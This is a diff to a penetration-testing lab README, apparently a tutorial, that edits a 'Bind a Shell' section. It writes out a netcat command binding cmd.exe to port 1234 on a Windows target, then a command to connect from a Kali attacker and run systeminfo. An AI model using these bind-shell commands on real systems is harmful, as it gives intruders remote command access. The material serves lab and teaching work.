@@ -38,11 +38,10 @@ Follow my repository (https://github.com/SavioFengGit/Trasferring-Malicious-Payl
 **Kali Attacker**:10.10.9.3 
 
 ## Bind a Shell 
-Execute the command on Windows Target: 
- - nc.exe -nvlp 1234 -e cmd.exe <br>
+ - nc.exe -nvlp 1234 -e cmd.exe (Windows in listening)<br>
 <img src="nct.png" width=70% height="auto"><br>
-We can now connect to the bind shell listener running on the Windows system from the Kali Linux system by running the following command: 
- - nc -nv 10.3.27.30 1234 (connect to the Windows Target ip)
+We can now connect to the Target system from the Kali Linux system by running the following command: 
+ - nc -nv 10.3.27.30 1234 (connect to the target)
  - systeminfo (check that we are into the Windows Machine)<br>
 <img src="nck.png" width=70% height="auto"><br>
 
